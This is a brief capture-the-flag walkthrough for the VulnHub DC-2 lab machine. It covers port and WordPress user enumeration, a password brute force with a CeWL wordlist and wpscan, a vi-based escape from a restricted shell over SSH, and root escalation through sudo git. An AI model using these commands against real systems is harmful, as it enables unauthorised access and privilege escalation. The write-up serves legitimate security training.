# [Machine](https://www.vulnhub.com/entry/dc-2,311/)

- # ENUM
	- ### nmap(`nmap -A -p- -T5 DC-2`)
		- ```PORT     STATE SERVICE VERSION
			80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
			| http-title: DC-2 &#8211; Just another WordPress site
			|_Requested resource was http://dc-2/
			|_http-server-header: Apache/2.4.10 (Debian)
			|_http-generator: WordPress 4.7.10
			7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
			| ssh-hostkey: 
			|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)
			|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)
			|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)
			|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)
			Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```
	- ### gobuster 
		- `/wp-login`
	- ### wpscan (wordpress scan) (`wpscan --url http://dc-2 --enumerate u`)
		- 3 users found:
			- admin
			- jerry
			- tom

- # EXPLOITATION
	- Run CeWL (custom wordlist generator): `cewl http://dc-2 -w passwords.txt`
	- Use WPscan again to bruteforce passwords: `wpscan --url http://dc-2 -U users.txt -P passwords.txt`
		- jerry's password: `adipiscing`
		- tom's password: `parturient`
	- Let's try if tom and jerry's passwords works also with SSH:
		- tom's password works!
			- The shell is restricted: 
			- `echo $PATH` -> `vi` -> `:set shell=/bin/bash` -> `:shell` -> `export SHELL=/bin/bash` -> `export PATH=/bin:/usr/bin`

- # PRIVILEGE ESCALATION
	- `su jerry` -> `sudo -l`
		- `git` is root!
			- Check GTFOBins (`git` -> `sudo` -> `(e)`)
				- You're ROOT!
